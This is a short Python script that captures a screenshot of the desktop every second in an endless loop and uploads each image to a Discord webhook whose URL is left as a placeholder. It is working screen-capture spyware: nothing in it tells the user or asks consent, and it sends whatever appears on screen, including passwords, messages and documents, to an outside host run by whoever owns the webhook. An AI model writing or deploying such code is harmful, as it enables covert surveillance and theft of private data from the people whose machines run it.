import pyautogui
import time
from discord_webhook import DiscordWebhook, DiscordEmbed

webhook_url = 'Webhook'

while True:
    # Take screenshot
    screenshot = pyautogui.screenshot()
    
    # Save screenshot to file
    screenshot_path = 'screenshot.png'
    screenshot.save(screenshot_path)
    
    # Send screenshot to webhook
    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title='Screenshot', description='Here is a screenshot of the desktop')
    with open(screenshot_path, 'rb') as f:
        screenshot_file = f.read()
    embed.set_image(url='attachment://screenshot.png')
    webhook.add_embed(embed)
    webhook.add_file(file=screenshot_file, filename='screenshot.png')
    webhook.execute()
    
    # Wait for 1 seconds before taking the next screenshot
    time.sleep(1)